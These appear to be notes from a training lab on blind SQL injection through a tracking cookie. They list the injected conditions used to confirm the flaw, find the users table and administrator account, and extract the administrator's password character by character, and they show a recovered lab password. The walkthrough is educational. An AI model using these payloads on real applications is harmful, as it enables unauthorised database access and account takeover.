Lab 11 - Blind SQL injection with conditional responses

Vulnerable parameter - tracking cookie

End Goals:
1) Enumerate the password of the administrator
2) Log in as the administrator user

Analysis:

1) Confirm that the parameter is vulnerable to blind SQLi

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN'

-> If this tracking id exists -> query returns value -> Welcome back message
-> If the tracking id doesn't exist -> query returns nothing -> no Welcome back message

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and 1=1--'
-> TRUE -> Welcome back

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and 1=0--'
-> FALSE -> no Welcome back

2) Confirm that we have a users table

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select 'x' from users LIMIT 1)='x'--'
-> users table exists in the database.

3) Confirm that username administrator exists users table

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator')='administrator'--'
-> administrator user exists

4) Enumerate the password of the administrator user

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--'
-> password is exactly 20 characters

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select substring(password,2,1) from users where username='administrator')='a'--'

1 2 3 45 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
52rqbjtjpa749cy0bv6s


script.py url


